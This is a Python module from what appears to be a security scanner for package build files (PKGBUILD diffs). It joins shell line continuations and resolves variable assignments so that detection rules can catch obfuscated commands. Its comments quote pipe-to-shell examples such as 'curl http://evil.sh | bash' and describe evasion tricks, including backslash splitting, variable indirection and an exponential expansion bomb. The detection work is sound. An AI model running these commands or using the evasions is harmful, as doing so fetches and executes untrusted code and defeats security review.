import re


def join_line_continuations(lines: list[str]) -> list[str]:
    """Join shell line continuations into single logical lines.

    Rules are matched one line at a time, so a command split with a
    trailing backslash slips past any pattern that has to see the whole
    pipeline::

        curl \\
          http://evil.sh | bash

    Without this, the CRITICAL "pipe to shell" rules see only ``curl \\``
    and the payload arrives as an unrelated fragment.  Only lines
    carrying the same diff marker are joined, so an addition is never
    spliced onto a removal.
    """
    out: list[str] = []
    # Accumulated as parts and joined once.  Appending to a string per
    # continuation line made this quadratic, so a diff of many backslash
    # continuations -- which an untrusted PKGBUILD controls -- cost time
    # proportional to the square of its length.
    parts: list[str] | None = None
    marker = ""

    def flush() -> str:
        return "".join(parts)

    for line in lines:
        this_marker = line[0] if line[:1] in ("+", "-") else ""
        body = line[1:] if this_marker else line
        if parts is not None and this_marker == marker:
            parts.append(" " + body.strip())
        else:
            if parts is not None:
                out.append(marker + flush())
            parts, marker = [body], this_marker
        tail = parts[-1]
        if tail.rstrip().endswith("\\"):
            parts[-1] = tail.rstrip()[:-1].rstrip()
        else:
            out.append(marker + flush())
            parts, marker = None, ""
    if parts is not None:
        out.append(marker + flush())
    return out


# Assignments are frequently indented (every one inside a function body
# is) and may be introduced by a declaration keyword.  Anchoring on the
# bare name meant the variable table stayed empty for function bodies,
# so `C=curl; $C evil | bash` never resolved and defeated every rule
# that matches resolved strings.
_ASSIGNMENT_RE = re.compile(
    r"^\s*(?:(?:local|export|declare|readonly|typeset)\s+)?(\w+)\s*=\s*(.+)"
)


_VAR_REF_RE = re.compile(r"\$\{(\w+)\}|\$(\w+)")


# Substitution is iterated, and each round can double a value that refers
# to itself twice (``b=$a$a``).  A chain of such assignments expands as
# 2**depth, so a 517-byte PKGBUILD was enough to exhaust a gigabyte and
# have the process OOM-killed.  Since the input is by definition an
# untrusted package, expansion is bounded on three axes: how large one
# value may grow, how large a single resolved line may grow, and how much
# the table may hold in total.  A value that would exceed its bound is
# left unexpanded rather than truncated: an unresolved "$payload" is
# reported as an unresolved pattern, whereas a truncated one would look
# like a fully resolved string with its tail silently removed.
_MAX_VALUE_LEN = 8192
_MAX_LINE_LEN = 65536
_MAX_TABLE_BYTES = 1 << 20


def _substitute(text: str, var_table: dict[str, str], limit: int = _MAX_LINE_LEN) -> str:
    """resolve variable references in text using a variable table"""
    def replacer(match: re.Match) -> str:
        """look up the matched variable in the table"""
        var = match.group(1) or match.group(2)
        return var_table.get(var, match.group(0))

    result = _VAR_REF_RE.sub(replacer, text)
    # Expanding this one reference blew the budget, so report the text as
    # it stood rather than a partially expanded string.
    return text if len(result) > limit else result


def _variable_table(additions: list[str]) -> dict[str, str]:
    """Resolve assignments among added lines into ``{name: value}``."""
    var_table: dict[str, str] = {}
    for line in additions:
        match = _ASSIGNMENT_RE.match(line)
        if not match:
            continue
        value = match.group(2).strip()
        if (value.startswith('"') and value.endswith('"')) or (
            value.startswith("'") and value.endswith("'")
        ):
            value = value[1:-1]
        # A command substitution has no static value, so it cannot be
        # folded into the table.
        if "$(" not in value and "`" not in value:
            var_table[match.group(1)] = value

    for _ in range(10):
        new_table = {
            k: _substitute(v, var_table, _MAX_VALUE_LEN)
            for k, v in var_table.items()
        }
        if new_table == var_table:
            break
        var_table = new_table
        if sum(len(v) for v in var_table.values()) > _MAX_TABLE_BYTES:
            # The table as a whole has grown past its budget, so stop
            # expanding.  What is already resolved stays usable.
            break
    return var_table


def resolve_added_lines(diff_text: str) -> list[str]:
    """Diff lines with each added line replaced by its resolved form.

    Order and count are preserved, so callers can still map a line back to
    its enclosing function via
    :func:`~trustsight.rules._classify_enclosing_function`.  Rules scoped to
    ``build()`` or ``pkgver()`` need that positional information.

    Substitution is applied per line rather than by zipping against
    :func:`tokenize_and_resolve`, whose output omits assignment lines: any
    added assignment made the two sequences different lengths and shifted
    every following line onto the wrong position.
    """
    lines = join_line_continuations(diff_text.splitlines())
    var_table = _variable_table(
        [ln[1:] for ln in lines if ln.startswith("+") and ln[1:].strip()]
    )
    return [
        "+" + _substitute(line[1:], var_table) if line.startswith("+") else line
        for line in lines
    ]


def tokenize_and_resolve(diff_text: str) -> tuple[list[str], list[str]]:
    """Tokenize a diff and resolve variable references in added lines."""
    additions = []
    for line in join_line_continuations(diff_text.splitlines()):
        if line.startswith("+"):
            content = line[1:]
            if content.strip():
                additions.append(content)

    var_table = _variable_table(additions)

    # An assignment whose value is statically known contributes its value
    # to the table rather than a command line to match against; anything
    # else is a candidate for resolution.
    unresolved_candidates = [
        line for line in additions
        if not (
            (m := _ASSIGNMENT_RE.match(line))
            and "$(" not in m.group(2)
            and "`" not in m.group(2)
        )
    ]

    resolved = [_substitute(line, var_table) for line in unresolved_candidates]
    return resolved, [u for u in unresolved_candidates if u not in resolved]